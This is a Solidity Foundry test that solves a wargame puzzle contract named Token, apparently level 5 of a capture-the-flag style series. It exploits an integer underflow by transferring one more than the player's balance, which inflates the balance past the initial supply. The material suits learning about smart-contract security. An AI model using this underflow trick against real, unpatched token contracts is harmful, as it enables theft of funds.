// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
// fix for legacy version of test
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {Token} from "../src/puzzles/5/Token.sol";


contract TokenTest is Test {
    Token internal puzzleContract;

    address player = makeAddr("player");
    address receiver = makeAddr("receiver");

    uint256 constant INITIAL_SUPPLY = 20;

    function setUp() public {
        vm.startPrank(player);
        puzzleContract = new Token(INITIAL_SUPPLY);
        vm.stopPrank();
    }

    function testSolveToken() public {
        uint256 balance = puzzleContract.balanceOf(player);
        uint256 overflowValue = balance + 1;
        vm.startPrank(player);
        puzzleContract.transfer(receiver, overflowValue);
        vm.stopPrank();
        assert(puzzleContract.balanceOf(player) > INITIAL_SUPPLY);
        console.log("Balance of player: ", puzzleContract.balanceOf(player));
        console.log("Balance of recevier: ", puzzleContract.balanceOf(receiver));
    }
}